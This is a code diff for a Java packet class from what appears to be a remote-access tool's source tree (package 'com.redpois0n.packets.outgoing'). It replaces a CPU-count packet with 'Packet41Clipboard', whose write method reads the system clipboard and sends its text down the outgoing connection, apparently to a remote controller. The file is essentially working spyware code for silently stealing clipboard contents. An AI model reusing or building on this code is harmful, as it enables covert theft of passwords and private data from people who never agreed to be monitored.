@@ -1,25 +1,21 @@
 package com.redpois0n.packets.outgoing;
 
+import java.awt.Toolkit;
+import java.awt.datatransfer.DataFlavor;
 import java.io.DataOutputStream;
 
 import com.redpois0n.common.io.StringWriter;
 
-
-public class Packet64InitAvailableProcessors extends AbstractOutgoingPacket {
-
-	private int processors;
-
-	public Packet64InitAvailableProcessors(int processors) {
-		this.processors = processors;
-	}
+public class Packet41Clipboard extends AbstractOutgoingPacket {
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		dos.writeShort(processors);
+		sw.writeLine((String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor));
 	}
 
 	@Override
 	public byte getPacketId() {
-		return (byte) 64;
+		return 41;
 	}
+
 }
